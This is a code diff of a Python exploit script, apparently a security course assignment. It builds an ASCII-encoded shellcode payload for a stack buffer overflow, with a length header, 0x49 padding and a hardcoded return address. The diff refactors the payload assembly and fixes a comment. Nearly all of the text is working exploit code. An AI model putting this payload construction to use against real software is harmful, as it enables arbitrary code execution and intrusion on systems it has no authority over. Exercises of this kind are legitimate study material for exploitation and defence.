@@ -61,7 +61,7 @@ def encode(data: bytes) -> Tuple[bytes, Iterable[int]]:
     for i in range(len(data)):
         byte = data[i]
         if data[i] > ASCII_MAX:
-            byte ^= XOR_VAL
+            byte = byte ^ XOR_VAL
             indices_array.append(i)
             
         xored_data.append(byte)
@@ -137,7 +137,7 @@ def get_ascii_shellcode() -> bytes:
          The bytes of the shellcode.
     """
     q2_shellcode = get_raw_shellcode()
-    ESP_to_EAX = [0x54,0x58] #push esb, pop eax
+    ESP_to_EAX = [0x54,0x58] #push esp, pop eax
     DEC_EAX = 0x48
     direct_eax = []
     
@@ -173,17 +173,16 @@ def get_payload() -> bytes:
     Returns:
          The bytes of the payload.
     """
-    payload_length = 1044 # = shellcode + nops + 4 bytes of return address
     
+    size = 1044 # = shellcode size
     #encode() does not change the size of message
-    ascii_shellcode = get_ascii_shellcode()
+    asm = get_ascii_shellcode()
+    NOPs_amount = size - len(asm) - 4
+    NOPs = bytes([0x49 for i in range(NOPs_amount)])
     
-    
-    size = struct.pack('>I', payload_length)
-    DECs = bytes([0x49 for i in range(938 - len(ascii_shellcode))]) #not including the 4 bytes of the return address
     ra = struct.pack('<I', 0xBFFFDD9C) #return address
-    before = bytes([0x49 for i in range(102)])
-    return size + before + ascii_shellcode + DECs + ra
+
+    return struct.pack('>I', size) + NOPs + asm + ra
 
 
 def main():
